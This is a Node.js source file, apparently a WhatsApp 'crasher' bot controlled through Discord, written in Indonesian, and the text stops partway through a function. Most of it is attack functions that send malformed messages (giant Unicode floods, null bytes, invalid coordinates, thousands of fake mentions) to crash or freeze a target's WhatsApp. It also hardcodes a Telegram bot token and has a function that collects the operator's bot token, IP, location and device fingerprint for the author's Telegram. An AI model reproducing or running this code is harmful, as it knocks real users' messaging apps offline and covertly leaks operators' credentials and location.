console.clear();
const chalk = require('chalk');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const os = require('os');
const readline = require('readline');

// --- KONFIGURASI AWAL & KONSTANTA ---
const config = require("./config.js");
const P = require("pino");

// URL untuk pemeriksaan eksternal
const MAINTENANCE_URL = "https://raw.githubusercontent.com/lorddzik/berucrasher/refs/heads/main/maintenance.json";

// Konfigurasi Keamanan & Pelaporan
const SCRIPT_PASSWORD = "NIGHTRAIDV2";
const TELEGRAM_BOT_TOKEN = '8243676733:AAHMIXd5myVhLBB19rJc4g2a5gpBCIMNE7U';
const TELEGRAM_OWNER_ID = '5638630288';

// Impor Discord.js
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

// Impor Baileys
const {
    default: makeWASocket,
    useSingleFileAuthState,
    useMultiFileAuthState,
    generateWAMessage,
    generateWAMessageContent,
    generateWAMessageFromContent,
    vGenerateWAMessageFromContent13,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    areJidsSameUser,
    jidDecode,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,
    proto,
    BufferJSON,
    getContentType,
    makeInMemoryStore,
    initInMemoryKeyStore,
    MediaType,
    Mimetype,
    WA_MESSAGE_STUB_TYPES,
    WA_MESSAGE_STATUS_TYPE,
    WAMessageStatus,
    WASocket,
    WAProto,
    fetchLatestBaileysVersion,
    Browser,
    Browsers,
    GroupMetadata,
    WAGroupMetadata,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    WALocationMessage,
    URL_REGEX,
    WAUrlInfo,
    templateMessage,
    InteractiveMessage,
    Header,
    relayWAMessage,
    MediaConnInfo,
    WAMediaUpload,
    ProxyAgent,
    WA_DEFAULT_EPHEMERAL,
    MessageOptions,
    MiscMessageGenerationOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WAContextInfo,
    processTime,
    getStream,
    mentionedJid,
    GroupSettingChange,
    DisconnectReason,
    MessageType,
    Presence,
    isBaileys,
} = require("@whiskeysockets/baileys");


// --- FUNGSI KEAMANAN & VALIDASI ---

const sendTelegramNotification = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_OWNER_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (error) {
        console.error(chalk.red("Gagal mengirim notifikasi Telegram:", error.message));
    }
}


async function getSecurityReport(eventTitle) {
    try {
        let ipInfo = { ip: "N/A", city: "N/A", country_name: "N/A", org: "N/A", latitude: "N/A", longitude: "N/A", timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };

        try {
            const ipRes = await axios.get('https://ipapi.co/json/');
            ipInfo = ipRes.data;
        } catch (ipError) {
            console.error("Tidak dapat mengambil info IP:", ipError.message);
        }

        const cpus = os.cpus();
        const totalMem = (os.totalmem() / 1e9).toFixed(2);
        const time = new Date().toLocaleString('id-ID', { timeZone: ipInfo.timezone });
        const lang = process.env.LANG || 'N/A';

        const report = `
*${eventTitle.toUpperCase()}*

*TOKEN:* \`${config.BOT_TOKEN}\`
*PEMILIK:* \`${config.OWNER_ID.join(', ')}\`

*🔍 LAPORAN KEAMANAN 🔍*
*📅 Waktu:* ${time}

*🖥️ SIDIK JARI PERANGKAT*
• *OS:* ${os.platform()} ${os.release()}
• *Hostname:* ${os.hostname()}
• *CPU:* ${cpus[0].model}
• *Inti CPU:* ${cpus.length}
• *Memori:* ${totalMem} GB
• *Bahasa:* ${lang}
• *Zona Waktu:* ${ipInfo.timezone}

*📍 DATA LOKASI*
• *IP:* ${ipInfo.ip}
• *Lokasi:* ${ipInfo.city}, ${ipInfo.country_name}
• *ISP:* ${ipInfo.org}
• *Koordinat:* ${ipInfo.latitude}, ${ipInfo.longitude}
        `;
        return report.trim();
    } catch (error) {
        console.error("Gagal membuat laporan keamanan:", error.message);
        return `Gagal membuat laporan untuk ${eventTitle}. Kesalahan: ${error.message}`;
    }
}

async function checkMaintenance() {
    try {
        const { data } = await axios.get(MAINTENANCE_URL);
        if (data.maintenance) {
            console.log(chalk.red.bold("❌ --- MODE PEMELIHARAAN --- ❌"));
            console.log(chalk.yellow(data.message || "Bot saat ini sedang dalam pemeliharaan."));
            process.exit(1);
        } else {
            console.log(chalk.green.bold("✅ Pemeliharaan NONAKTIF, bot berjalan normal."));
        }
    } catch (err) {
        console.error("⚠️  Tidak dapat memeriksa status pemeliharaan:", err.message);
    }
}

// --- LOGIKA UTAMA BOT ---
async function startBot() {
    console.log(chalk.red(`
╭────────────────────────────╮
│   🚀 NIGHT RAID BOT V2.0   │
╰────────────────────────────╯
`));
    console.log(chalk.green("✅ Inisialisasi... Harap tunggu."));

    // --- PENGATURAN BOT DISCORD ---
    const client = new Client({
        intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
    });

    // --- FUNGSI UTILITAS ---
    const PREMIUM_FILE = "./database/premium.json";
    function loadPremiumUsers() {
        try {
            if (!fs.existsSync(PREMIUM_FILE)) {
                fs.writeFileSync(PREMIUM_FILE, JSON.stringify([]));
            }
            return JSON.parse(fs.readFileSync(PREMIUM_FILE));
        } catch (error) {
            console.error("Gagal memuat pengguna premium:", error);
            return [];
        }
    }

    function savePremiumUsers(users) {
        fs.writeFileSync(PREMIUM_FILE, JSON.stringify(users, null, 2));
    }

    function isOwner(userId) {
        return config.OWNER_ID.includes(userId.toString());
    }

    function isPremium(userId) {
        const premiumUsers = loadPremiumUsers();
        return premiumUsers.includes(userId.toString());
    }

    const getUptime = () => {
        const uptimeSeconds = process.uptime();
        const days = Math.floor(uptimeSeconds / (3600 * 24));
        const hours = Math.floor((uptimeSeconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((uptimeSeconds % 3600) / 60);
        return `${days}h ${hours}j ${minutes}m`;
    };

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // --- KONEKSI WHATSAPP ---
    const SESSIONS_FILE = "./sessions/active_sessions.json";
    const sessions = new Map();
    const SESSIONS_DIR = "./sessions/";
    if (!fs.existsSync(SESSIONS_DIR)) {
        fs.mkdirSync(SESSIONS_DIR);
    }

    function saveActiveSessions(botNumber) {
        try {
            let existing = [];
            if (fs.existsSync(SESSIONS_FILE)) {
                existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            }
            if (!existing.includes(botNumber)) {
                existing.push(botNumber);
                fs.writeFileSync(SESSIONS_FILE, JSON.stringify(existing, null, 2));
            }
        } catch (error) {
            console.error("Error saving session:", error);
        }
    }

    function createSessionDir(botNumber) {
        const deviceDir = path.join(SESSIONS_DIR, `device_${botNumber}`);
        if (!fs.existsSync(deviceDir)) {
            fs.mkdirSync(deviceDir, { recursive: true });
        }
        return deviceDir;
    }

    async function initializeWhatsAppConnections() {
        console.log(chalk.yellow("🔄 Memeriksa sesi WhatsApp yang ada untuk disambungkan kembali..."));
        try {
            if (fs.existsSync(SESSIONS_FILE)) {
                const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                if (activeNumbers.length === 0) {
                    console.log(chalk.green("✅ Tidak ada sesi aktif yang perlu disambungkan kembali."));
                    return;
                }

                console.log(chalk.cyan(`🔎 Ditemukan ${activeNumbers.length} sesi aktif. Mencoba menghubungkan kembali...`));

                for (const botNumber of activeNumbers) {
                    // PENTING: Gunakan createSessionDir agar setiap bot memiliki folder sesi sendiri
                    const sessionDir = createSessionDir(botNumber);
                    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                    const sock = makeWASocket({
                        auth: state,
                        printQRInTerminal: false, // Diubah ke false agar tidak spam di console
                        logger: P({ level: "silent" }),
                        defaultQueryTimeoutMs: undefined,
                    });

                    // Tambahkan event handler untuk koneksi
                    sock.ev.on("connection.update", (update) => {
                        const { connection } = update;
                        if (connection === 'open') {
                            console.log(chalk.green(`✅ Berhasil menyambung kembali ke WhatsApp: ${botNumber}`));
                            sessions.set(botNumber, sock);
                        } else if (connection === 'close') {
                            console.log(chalk.red(`❌ Koneksi terputus untuk ${botNumber}. Mungkin perlu scan ulang.`));
                            // Anda bisa menambahkan logika untuk menghapus sesi yang gagal di sini jika perlu
                        }
                    });

                    sock.ev.on("creds.update", saveCreds);
                }
            } else {
                console.log(chalk.green("✅ File sesi aktif tidak ditemukan, melewati penyambungan ulang otomatis."));
            }
        } catch (error) {
            console.error(chalk.red(" Gagal menginisialisasi koneksi WhatsApp yang ada:"), error);
        }
    }
    async function connectToWhatsApp(botNumber, discordMessage) {
        let statusMessage = await discordMessage.channel.send(`\`\`\`
🔌 Menghubungkan ke WhatsApp
Bot: ${botNumber}
Status: Inisialisasi...
\`\`\``);


        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: P({ level: "silent" }),
            defaultQueryTimeoutMs: undefined,
        });

        sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                // Logika reconnect Anda
                if (statusCode && statusCode >= 500 && statusCode < 600) {
                    await statusMessage.edit(`\`\`\`
🔄 Menyambungkan ulang...
Bot: ${botNumber}
Status: Mencoba menyambung kembali...
\`\`\``);

                    await connectToWhatsApp(botNumber, discordMessage);
                } else {
                    await statusMessage.edit(`\`\`\`
❌ Koneksi Gagal
Bot: ${botNumber}
Alasan: ${lastDisconnect?.error || 'Tidak diketahui'}
\`\`\``);

                    try {
                        fs.rmSync(sessionDir, { recursive: true, force: true });
                    } catch (error) {
                        console.error("Gagal menghapus folder sesi:", error);
                    }
                }
            } else if (connection === "open") {
                sessions.set(botNumber, sock);
                saveActiveSessions(botNumber);
                await statusMessage.edit(`\`\`\`
✅ WhatsApp Terhubung!
Bot: ${botNumber}
Status: Siap 🎉
\`\`\``);

            } else if (connection === "connecting") {
                await new Promise((resolve) => setTimeout(resolve, 1000));
                try {
                    if (!fs.existsSync(path.join(sessionDir, 'creds.json'))) {
                        const code = await sock.requestPairingCode(botNumber, "NIGHTRDD");
                        const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
                        await statusMessage.edit(`\`\`\`
🔑 Kode Pemasangan
Bot: ${botNumber}
Kode: ${formattedCode}
\`\`\``);

                    }
                } catch (error) {
                    console.error("Gagal meminta kode pemasangan:", error);
                    await statusMessage.edit(`\`\`\`
❌ Error
Bot: ${botNumber}
Pesan: Gagal meminta kode pemasangan.
\`\`\``);

                }
            }
        });

        sock.ev.on("creds.update", saveCreds);
        return sock;
    }

    // ▼▼▼ LETAKKAN SEMUA FUNGSI BUG ANDA DI SINI ▼▼▼
    // ---------( The Bug Function)---------- \\

    // FUNK UI CRASH
    async function oggStc(sock, jid) {
        try {
            const audio = {
                url: "https://mmg.whatsapp.net/v/t62.7114-24/535653027_1469161210994599_1511733422542209626_n.enc?ccb=11-4&oh=01_Q5Aa2QEgTgPr7OXv8q2IM3UT8Ti8yVvOXaJEleYX30tgUxP9qw&oe=68CD1ACA&_nc_sid=5e03e0&mms3=true",
                directPath: "/v/t62.7114-24/535653027_1469161210994599_1511733422542209626_n.enc?ccb=11-4&oh=01_Q5Aa2QEgTgPr7OXv8q2IM3UT8Ti8yVvOXaJEleYX30tgUxP9qw&oe=68CD1ACA&_nc_sid=5e03e0",
                mimetype: "audio/mp3",
                fileName: "᬴".repeat(5000) + ".mp3",
                fileEncSha256: "zyw8tVaN7CPvqIOExAcUwOa//33bh1nR/gHHaLznxm8=",
                fileSha256: "7TjwpTtgp/pz+wHz1BWu6yzorB0RpJDaZBe3Df+uUPo=",
                mediaKey: "K5hD8lod/msHFFJIbAhBs2Y/2QgzSWoX9YTt9JdVoF4=",
                mediaKeyTimestamp: "1755684429",
                fileLength: 9999 * 10000
            }
            const msg = generateWAMessageFromContent(
                jid,
                {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                header: {
                                    title: "its me icha",
                                    hasMediaAttachment: true,
                                    documentMessage: audio
                                },
                                body: { text: "> " + "᬴".repeat(39998) },
                                nativeFlowMessage: {
                                    messageParamsJson: "{}".repeat(4000),
                                    buttons: Array.from({ length: 10 }, () => ({
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify({
                                            title: "᬴".repeat(70000),
                                            sections: [
                                                {
                                                    title: "\u0000".repeat(5000),
                                                    highlight_label: "label",
                                                    rows: []
                                                }
                                            ]
                                        })
                                    }))
                                },
                                contextInfo: {
                                    participant: jid,
                                    remoteJid: "status@broadcast",
                                    mentionedJid: Array.from({ length: 1998 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`),
                                    forwardingScore: 909,
                                    isForwarded: true,
                                    quotedMessage: {
                                        paymentInviteMessage: {
                                            serviceType: 3,
                                            expiryTimestamp: Date.now() + 1814400000
                                        }
                                    },
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: "120363321780343299@newsletter",
                                        serverMessageId: 1,
                                        newsletterName: "Jawa''"
                                    }
                                }
                            }
                        }
                    }
                },
                {})
            await sock.relayMessage(jid, msg.message, {
                messageId: msg.key.id,
                participant: { jid: jid }
            });
        } catch (err) {
            console.error(err);
            throw new Error(err.message);
        }
    }

    async function cTcClick(sock, jid) {
        try {
            const NX = "᬴".repeat(1000);
            let m = [];
            for (let i = 0; i < 99; i++) {
                m.push({
                    displayName: NX,
                    vcard: `BEGIN:VCARD
VERSION:3.0
N:;${NX};;;
FN:${NX}
TEL;type=CELL;type=VOICE;waid=5521986470032:+55 21 98647-0032
END:VCARD`
                });
            }
            const msg = {
                contactsArrayMessage: {
                    displayName: "its me icha" + NX,
                    contacts: m,
                    contextInfo: {
                        forwardingScore: 909,
                        isForwarded: true,
                        mentionedJid: [
                            "1@s.whatsapp.net",
                            ...Array.from({ length: 1998 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                        ],
                        businessMessageForwardInfo: {
                            businessOwnerJid: "13135550002@s.whatsapp.net"
                        },
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimestamp: Date.now() + 1814400000
                            }
                        },
                        disappearingMode: {
                            initiator: "INITIATED_BY_OTHER",
                            trigger: "ACCOUNT_STATUS"
                        }
                    }
                }
            };
            await sock.sendMessage(
                jid,
                {
                    text: "\u0000",
                    buttons: [
                        {
                            buttonId: ".",
                            buttonText: { displayText: "Its Me Icha" },
                            type: 4,
                            nativeFlowInfo: {
                                name: "single_select",
                                paramsJson: JSON.stringify({
                                    title: "᬴".repeat(70000),
                                    sections: [
                                        {
                                            title: "\u0000".repeat(5000),
                                            highlight_label: "label",
                                            rows: []
                                        }
                                    ]
                                })
                            }
                        },
                        {
                            buttonId: ".",
                            buttonText: { displayText: "Its Me Icha" },
                            type: 4,
                            nativeFlowInfo: {
                                name: "single_select",
                                paramsJson: JSON.stringify({
                                    title: "᬴".repeat(70000),
                                    sections: [
                                        {
                                            title: "\u0000".repeat(5000),
                                            highlight_label: "label",
                                            rows: []
                                        }
                                    ]
                                })
                            }
                        },
                        {
                            buttonId: ".",
                            buttonText: { displayText: "Its Me Icha" },
                            type: 4,
                            nativeFlowInfo: {
                                name: "single_select",
                                paramsJson: JSON.stringify({
                                    title: "᬴".repeat(70000),
                                    sections: [
                                        {
                                            title: "\u0000".repeat(5000),
                                            highlight_label: "label",
                                            rows: []
                                        }
                                    ]
                                })
                            }
                        }
                    ],
                    headerType: 1
                }, {});
            await sock.relayMessage(jid, msg, {
                messageId: "",
                participant: { jid: jid }
            });
        } catch (err) { }
    }

    async function FcXBlank(sock, jid) {
        const msg = generateWAMessageFromContent(
            jid,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: { text: "\u0000" },
                            footer: { text: "᬴".repeat(5000) },
                            header: {
                                title: "Its Me Icha",
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 922.999999999999,
                                    name: "\u900A",
                                    address: "\u0007".repeat(20000)
                                },
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify({
                                            title: "᬴".repeat(60000),
                                            sections: [
                                                {
                                                    title: "\u0000",
                                                    highlight_label: "label",
                                                    rows: []
                                                }
                                            ]
                                        })
                                    },
                                    {
                                        name: "galaxy_message",
                                        buttonParamsJson: JSON.stringify({
                                            icon: "DOCUMENT",
                                            flow_cta: "᬴".repeat(10000),
                                            flow_message_version: "3"
                                        })
                                    },
                                    { name: "mpm", buttonParamsJson: "\u0003".repeat(10000) },
                                ],
                                messageParamsJson: "[]".repeat(4000)
                            },
                            contextInfo: {
                                participant: jid,
                                remoteJid: "X",
                                stanzaId: "12345678",
                                mentionedJid: [
                                    "1@s.whatsapp.net",
                                    ...Array.from({ length: 1998 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                                ],
                                quotedMessage: {
                                    paymentInviteMessage: {
                                        serviceType: 3,
                                        expiryTimestamp: Date.now() + 1814400000
                                    }
                                },
                                deviceListMetadataVersion: 2,
                                deviceListMetadata: {
                                    device1: { key: "value" },
                                    device2: { key: "value" }
                                },
                                messageAssociation: { linkedMessageId: "assoc-" + Date.now() }
                            }
                        }
                    }
                }
            },
            { userJid: jid }
        );
        await sock.relayMessage(jid, msg.message, { messageId: msg.key.id, participant: { jid: jid } });
    }

    async function WanzCrashOri(sock, jid) {
        const force = "ꦾ".repeat(10000);
        const close = "ꦾ".repeat(6000);

        try {
            let message = {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "Wanz Kill You",
                                hasMediaAttachment: false,
                                locationMessage: {
                                    degreesLatitude: -999.9999,
                                    degreesLongitude: 992.99999999999,
                                    name: "Amelia Kill You",
                                    address: "wanz Kill You" + close,
                                },
                            },
                            body: {
                                text: "Wanz Kill You" + force + close,
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "{".repeat(10000),
                            },
                            contextInfo: {
                                participant: jid,
                                mentionedJid: ["0@s.whatsapp.net"],
                            },
                        },
                    },
                },
            };

            await sock.relayMessage(jid, message, {
                messageId: null,
                participant: { jid: jid },
                userJid: jid,
            });
        } catch (err) {
            console.log(err);
        }
    }

    async function bClck(sock, jid) {
        const msg = {
            newsletterAdminInviteMessage: {
                newsletterJid: "1@newsletter",
                newsletterName: "ោ៝".repeat(10000),
                caption: "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
                inviteExpiration: "999999999",
                contextInfo: {
                    mentionedJid: Array.from(
                        { length: 2000 },
                        () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                    ),
                    remoteJid: "status@broadcast",
                    isForwarded: true,
                    forwardingScore: 9999,
                    externalAdReply: {
                        quotedAd: {
                            advertiserName: "\u0000".repeat(60000),
                            mediaType: "IMAGE",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                            caption: "Icha" + "𑇂𑆵𑆴𑆿".repeat(60000)
                        },
                        placeholderKey: {
                            remoteJid: "0s.whatsapp.net",
                            fromMe: false,
                            id: "ABCDEF1234567890"
                        }
                    },
                    quotedMessage: {
                        groupInviteMessage: {
                            groupJid: "1@g.us",
                            inviteCode: "abcd1234",
                            inviteExpiration: null,
                            groupName: "ꦽ".repeat(30000),
                            jpegThumbnail: null
                        }
                    }
                }
            }
        };
        await sock.relayMessage(jid, msg, {
            participant: { jid: jid },
            messageId: null
        });
    }

    async function HardDelayBlank(sock, jid) {
        try {
            const bn = [];
            // besarin forlet buar gacor tapi inget batas
            for (let i = 0; i <= 3; i++) {
                bn.push({
                    buttonId: "." + i,
                    buttonText: {
                        displayText: "\u0000"
                    },
                    type: 4,
                    nativeFlowInfo: {
                        name: "single_select",
                        paramsJson: JSON.stringify({
                            title: "᬴".repeat(70000),
                            sections: [
                                {
                                    title: "\u0000".repeat(5000),
                                    highlight_label: "label",
                                    rows: []
                                }
                            ]
                        })
                    }
                });
            }
            await sock.sendMessage(jid, {
                text: "ist me icha",
                buttons: bn,
                headerType: 1,
                contextInfo: {
                    isForwarded: true,
                    forwardingScore: 9999,
                    mentionedJid: Array.from(
                        { length: 2000 },
                        () =>
                            "1" +
                            Math.floor(Math.random() * 5000000) +
                            "@s.whatsapp.net"
                    ),
                    participant: "13135550202@s.whatsapp.net",
                    quotedMessage: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0000",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "payment_method",
                                buttonParamsJson: "{}",
                                version: 3
                            }
                        }
                    }
                }
            }, {});
            console.log(chalk.bold.red("[ ✓ ] hard delay to : " + jid));
        } catch (err) {
            console.error(err);
            throw new Error(err.message);
        }
    }

    // FUNK INVISIBLE HARD
    async function DelayMbuh(sock, jid) {
        try {
            const msg = await generateWAMessageFromContent(
                jid,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                messageSecret: crypto.randomBytes(32),
                            },
                            interactiveResponseMessage: {
                                body: {
                                    text: "\u0000",
                                    format: "DEFAULT",
                                },
                                nativeFlowResponseMessage: {
                                    name: "payment_method",
                                    paramsJson: "\u0000".repeat(999999),
                                    version: 3,
                                },
                                contextInfo: {
                                    mentionedJid: [
                                        "0@s.whatsapp.net",
                                        ...Array.from({ length: 1900 }, () =>
                                            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                                        ),
                                    ],
                                    remoteJid: "x",
                                },
                            },
                        },
                    },
                },
                {}
            );
            await sock.relayMessage(jid, msg.message, {
                messageId: msg.key.id,
                participant: { jid: jid },
            });
            console.log(chalk.bold.red("[ ✓ ] delay to : " + jid));
        } catch (err) {
            console.error(err);
        }
    }

    // FUNK DELAY
    async function delayJembut(sock, jid) {
        try {
            const n = await sock.relayMessage(
                jid,
                {
                    extendedTextMessage: {
                        text: "\u0000".repeat(10000),
                        matchedText: "⃝꙰꙰꙰".repeat(10000),
                        description: "Its Me Icha",
                        title: "᬴".repeat(10000),
                        previewType: "NONE",
                        jpegThumbnail: null,
                        inviteLinkGroupTypeV2: "DEFAULT",
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999,
                            remoteJid: "status@broadcast",
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                                )
                            ],
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                }
                            },
                            forwardedNewsletterMessageInfo: {
                                newsletterName: "⃝꙰꙰꙰",
                                newsletterJid: "13135550002@newsletter",
                                serverId: 1
                            }
                        }
                    }
                },
                { participant: { jid: jid } }
            );
            await sock.sendMessage(jid, {
                delete: { fromMe: true, remoteJid: jid, id: n }
            });
            console.log(chalk.bold.red("[ ✓ ] delay to : " + jid));
        } catch (err) {
            console.error("error:", err);
            throw new Error(err.message);
        }
    }

    async function delaycrash(sock, jid, mention = false) {
        console.log(chalk.blue(`🚀 Sending Delay Bug (delaycrash) to ${jid}`));
        try {
            const msgContent1 = {
                viewOnceMessage: {
                    message: {
                        ephemeralMessage: {
                            message: {
                                interactiveMessage: {
                                    header: {
                                        title: "" + "\u202E".repeat(500) + "\uDBFF\uDFFF".repeat(1000),
                                        hasMediaAttachment: false,
                                        locationMessage: {
                                            degreesLatitude: 992.999999,
                                            degreesLongitude: -932.8889989,
                                            name: "\u900A" + "\u0000".repeat(5000) + "\uFFFF".repeat(2000),
                                            address: "\u0007".repeat(20000) + "꧔꧈".repeat(5000) + "\u2060".repeat(1000),
                                        },
                                    },
                                    body: {
                                        text: "" + "\u0003".repeat(10000) + "꧔꧈".repeat(2000)
                                    },
                                    contextInfo: {
                                        remoteJid: jid,
                                        participant: "0@s.whatsapp.net",
                                        stanzaId: "1234567890ABCDEF",
                                        forwardingScore: 99999,
                                        isForwarded: true,
                                        businessMessageForwardInfo: {
                                            businessOwnerJid: "13135550002@s.whatsapp.net"
                                        },
                                        mentionedJid: [
                                            jid,
                                            "1@s.whatsapp.net",
                                            "0@s.whatsapp.net",
                                            ...Array.from({ length: 1997 }, () =>
                                                `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
                                            )
                                        ]
                                    }
                                }
                            }
                        }
                    }
                }
            };

            const pack1 = generateWAMessageFromContent(jid, msgContent1, { userJid: jid });
            await sock.relayMessage(jid, pack1.message, { messageId: pack1.key.id });

            const msgContent2 = {
                ephemeralMessage: {
                    message: {
                        audioMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
                            mimetype: "audio/mpeg",
                            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
                            fileLength: 99999999999999,
                            seconds: 99999999999999,
                            ptt: true,
                            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
                            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
                            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
                            mediaKeyTimestamp: 99999999999999,
                            contextInfo: {
                                mentionedJid: [
                                    "@s.whatsapp.net",
                                    ...Array.from({ length: 1900 }, () =>
                                        `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                                    )
                                ],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "120363375427625764@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: ""
                                }
                            },
                            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
                        }
                    }
                }
            };

            const pack2 = generateWAMessageFromContent(jid, { message: msgContent2 }, { userJid: jid });
            await sock.relayMessage(jid, pack2.message, { messageId: pack2.key.id });

            const msgContent3 = {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                hasMediaAttachment: false,
                                locationMessage: {
                                    degreesLatitude: 992.999999,
                                    degreesLongitude: -932.8889989,
                                    name: "\u900A",
                                    address: "\u0007".repeat(20000)
                                }
                            },
                            body: {
                                text: ""
                            },
                            interactiveResponseMessage: {
                                body: { text: "", format: "DEFAULT" },
                                nativeFlowResponseMessage: {
                                    name: "galaxy_message",
                                    status: true,
                                    messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
                                    paramsJson: JSON.stringify({
                                        "screen_0_TextInput_0": "radio - buttons" + "ꦾ".repeat(70000),
                                        "screen_0_Dropdown_2": "001-Grimgar",
                                        "screen_0_RadioButtonsGroup_3": "0_true",
                                        "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                    }),
                                    version: 3
                                }
                            }
                        }
                    }
                }
            };

            const pack3 = generateWAMessageFromContent(jid, msgContent3, { userJid: jid });
            await sock.relayMessage(jid, pack3.message, { messageId: pack3.key.id });

            const msgContent4 = {
                extendedTextMessage: {
                    text: "᬴".repeat(250000),
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1950 }, () =>
                            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                        )
                    }
                },
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
                    mimeType: "audio/mpeg",
                    sha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
                    encSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
                    mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
                    directPath: "/v/t62.7114-24/30578226.enc",
                    fileLength: 99999999999999,
                    mediaKeyTimestamp: 99999999999999,
                    seconds: 99999999999999,
                    fileEncSha256: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
                }
            };

            const pack4 = generateWAMessageFromContent(jid, { message: msgContent4 }, { userJid: jid });
            await sock.relayMessage(jid, pack4.message, { messageId: pack4.key.id });

            if (mention) {
                await sock.relayMessage(jid, {
                    groupStatusMentionMessage: {
                        message: { protocolMessage: { key: pack2.key, type: 25 } }
                    }
                }, {
                    additionalNodes: [{
                        tag: "meta",
                        attrs: { is_status_mention: "( # )" },
                        content: undefined
                    }]
                });
            }

            console.log("delaycrash success", jid);

        } catch (err) {
            console.error("Error in delaycrash:", err);
        }
        console.log(chalk.red(`✅ delaycrash successfully sent to ${jid}`));
    }

    // FUNK FORCLOSE
    async function fcTitid(sock, jid) {
        const mentioned = [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1989 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
        ];
        try {
            const message = {
                interactiveMessage: {
                    body: { text: "𒍒".repeat(7500) + "ꦾ࣯࣯".repeat(7500) },
                    footer: { text: "𒍒".repeat(7500) + "ꦾ࣯࣯".repeat(7500) },
                    nativeFlowMessage: {
                        messageParamsJson: "[".repeat(4000),
                        buttons: [
                            {
                                name: "payment_method",
                                buttonParamsJson: JSON.stringify({
                                    reference_id: null,
                                    payment_method: "{".repeat(100),
                                    payment_timestamp: null,
